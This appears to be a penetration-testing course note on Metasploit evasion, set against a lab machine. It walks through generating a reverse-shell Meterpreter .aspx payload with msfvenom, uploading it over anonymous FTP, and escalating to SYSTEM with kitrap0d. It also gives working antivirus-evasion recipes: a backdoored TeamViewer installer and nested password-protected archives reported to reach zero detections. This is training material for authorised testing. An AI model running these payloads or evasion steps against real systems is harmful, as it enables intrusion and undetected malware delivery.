# 08 — Metasploit Framework · 4. Evasion

## Introduction to MSFVenom

MSFVenom is the successor to **MSFPayload** and **MSFEncode** — two stand-alone scripts that used to work alongside `msfconsole`:

- **MSFPayload** generated shellcode for a specific architecture and OS.
- **MSFEncode** applied encoding schemes to remove bad characters and evade older AV/IPS/IDS.

You used to pipe (`|`) the output of one into the other. MSFVenom merges both into a single tool that crafts payloads for different targets and "cleans up" shellcode so it runs without errors when deployed.

> AV evasion is much harder today. Signature-only analysis is a thing of the past — heuristic analysis, machine learning, and deep packet inspection mean simply running a payload through several encoder iterations is no longer enough. A simple payload with default settings can hit detection rates like 52/65 on VirusTotal.

---

## Building a Payload (FTP + web service scenario)

**Scenario:** An open FTP port allows anonymous login. The FTP root is served by a web service on `tcp/80` under `/uploads`, and the web service runs anything you upload. You can drop a shell via FTP and trigger it from the web to get a reverse TCP connection.

### 1. Scan the target

```sh
nmap -sV -T4 -p- 10.10.10.5
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows
```

### 2. Anonymous FTP access

```sh
ftp 10.10.10.5
# Name: anonymous
# 230 User logged in.
ftp> ls
```

```
03-18-17  02:06AM  <DIR>  aspnet_client
03-17-17  05:37PM    689  iisstart.htm
03-17-17  05:37PM 184946  welcome.png
```

The `aspnet_client` directory tells us the box can run `.aspx` reverse shells.

### 3. Generate the .aspx payload

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

```
[-] No platform was selected, choosing Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Payload size: 341 bytes
Final size of aspx file: 2819 bytes
```

### 4. Upload via FTP

```sh
ftp> put reverse_shell.aspx
# 226 Transfer complete.
```

### 5. Set up the handler

```sh
msfconsole -q
use multi/handler
set LHOST 10.10.14.5
set LPORT 1337
run
```

```
[*] Started reverse TCP handler on 10.10.14.5:1337
```

### 6. Trigger and catch the shell

Browse to `http://10.10.10.5/reverse_shell.aspx`. The page renders blank (no HTML in the payload), but the payload runs in the background.

```
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.5:1337 -> 10.10.10.5:49157)

meterpreter > getuid
Server username: IIS APPPOOL\Web
```

> If the Meterpreter session dies often, encoding the payload can reduce runtime errors.

---

## Local Exploit Suggester (PrivEsc)

The `IIS APPPOOL\Web` user has few permissions and the system is x86 — good reasons to run the suggester.

```sh
search local exploit suggester
use post/multi/recon/local_exploit_suggester
set session 2
run
```

```
[*] 10.10.10.5 - 31 exploit checks are being tried...
[+] exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
...
```

`bypassuac_eventvwr` fails (the IIS user isn't an admin, as expected). The next option, `ms10_015_kitrap0d`, works.

### Privilege escalation with KiTrap0D

```sh
search kitrap0d
use exploit/windows/local/ms10_015_kitrap0d
set LPORT 1338
set SESSION 3
run
```

```
[*] Launching notepad to host the exploit...
[*] Reflectively injecting the exploit DLL ...
[*] Meterpreter session 4 opened (10.10.14.5:1338 -> 10.10.10.5:49162)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## Firewall & IDS/IPS Evasion

To attack quietly, understand how the target is defended. Two key terms:

### Endpoint protection

Localized software protecting a single host (PC, workstation, or DMZ server). Usually bundles AV, anti-malware, firewall, and anti-DDoS into one package. Examples: Avast, NOD32, Malwarebytes, BitDefender.

### Perimeter protection

Physical or virtual devices at the network edge that gate access between public and private zones.

### The DMZ

A zone between public and private with a lower security policy than internal networks but higher trust than the open Internet. Hosts public-facing servers that are still managed and patched from the inside.

---

## Security Policies

Security policies drive a network's security posture — essentially allow/deny lists (like Cisco ACLs) governing how traffic and files move within a boundary. They can target different objects:

- Network Traffic Policies
- Application Policies
- User Access Control Policies
- File Management Policies
- DDoS Protection Policies
- Others

They all operate on the same allow/deny principle; only the target object differs.

### How events are matched to policy

| Method | Description |
|---|---|
| Signature-based Detection | Compares packets against pre-built attack patterns (signatures). A 100% match raises an alarm. |
| Heuristic / Statistical Anomaly Detection | Compares behavior against an established baseline (including known-APT modus operandi). Deviations past a threshold raise alarms. |
| Stateful Protocol Analysis Detection | Detects protocol divergence by comparing events to vendor profiles of accepted, non-malicious activity. |
| Live Monitoring & Alerting (SOC-based) | Analysts watch a live feed and decide whether to action threats manually or let automation respond. |

---

## Evasion Techniques

Most host AV relies on **signature-based detection**: signatures live in the AV engine and scan storage and running processes. On a match, the AV quarantines the file and kills the process.

Encoding payloads with multiple iterations isn't enough for all AV. Simply establishing a C2 channel can also trip IDS/IPS.

### AES-encrypted tunnels (MSF6)

With MSF6, `msfconsole` tunnels **AES-encrypted** communication from any Meterpreter shell back to the attacker, encrypting traffic as the payload is sent. This handles most network-based IDS/IPS. Very strict rulesets may still flag by source IP — the workaround is to use services that are allowed through. (See the 2017 Equifax breach, where attackers abused an Apache Struts vuln and used DNS exfiltration to siphon data unnoticed for months.)

Combined with Meterpreter running **in memory**, AES tunnels raise capability significantly. The remaining problem is what happens to the payload *file* before it runs — it can be fingerprinted, matched, and blocked. AV vendors actively add default MSF payloads to their signature databases, so most default payloads are caught immediately today.

### Executable templates (backdoored executables)

`msfvenom` can inject a payload into a legitimate executable template, hiding shellcode inside real program code. This greatly obfuscates the payload and lowers detection. Combining legitimate executables, encoding schemes/iterations, and payload variants produces a **backdoored executable**.

```sh
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k \
  -x ~/Downloads/TeamViewer_Setup.exe \
  -e x86/shikata_ga_nai -a x86 --platform windows \
  -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

> **`-k` flag:** runs the payload in a separate thread so the original app continues executing normally. Without it, the target may notice nothing visible. Note: if launched from a CLI, a separate window pops up that stays open until the session ends.

### Archives

Archiving a file and **password-protecting** the archive bypasses many AV signatures. Downside: AV dashboards flag the archive as "unable to scan" because it's locked, which an admin can choose to inspect manually.

#### Baseline a raw encoded payload

```sh
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k \
  -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```

VirusTotal baseline for the raw `test.js`: **11 / 59** detections (mostly `Shikata.Gen` / `ShikataGaNai` signatures from ALYac, AVG, Avast, BitDefender, ClamAV, Emsisoft, FireEye, GData, etc.).

#### Double-archive with passwords, then strip the extension

```sh
# install RAR
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar

# first archive (password-protected)
rar a ~/test.rar -p ~/test.js
mv test.rar test            # remove .rar extension

# second archive (password-protected)
rar a test2.rar -p test
mv test2.rar test2          # remove .rar extension
```

Re-checking `test2` on VirusTotal: **0 / 49** detections.

```sh
msf-virustotal -k <API key> -f test2
# Analysis Report: test2 (0 / 49)
```

### Packers

A **packer** compresses a payload together with an executable and decompression code into one file. At runtime the decompression code restores the original backdoored executable in memory — adding another layer against file scanners while keeping original functionality. `msfvenom` can compress, restructure, and encrypt the underlying process structure.

Popular packers:

| | | |
|---|---|---|
| UPX packer | The Enigma Protector | MPRESS |
| Alternate EXE Packer | ExeStealth | Morphine |
| MEW | Themida | — |

> See the **PolyPack** project to learn more.

### Exploit coding

When writing or porting an exploit, make sure the code isn't easily fingerprinted. A typical Buffer Overflow stands out due to its hex buffer patterns, which IDS/IPS can match.

- **Randomization** breaks well-known buffer signatures. In a module, vary the `Offset`:

  ```ruby
  'Targets' =>
  [
      [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
  ],
  ```

- Avoid obvious **NOP sleds**. The BoF code crashes the target service; the NOP sled is the allocated memory where the shellcode lands. IDS/IPS check both, so test custom exploit code against a sandbox before deploying on a client network — you often get only one chance.

> Reference: *Metasploit — The Penetration Tester's Guide* (No Starch Press).

---

## A Note on Evasion

This section is a high-level overview only. Evasion is a vast topic covered more deeply in later modules. Good practice: try these techniques against older HTB machines or a VM running older Windows Defender / free AV engines.
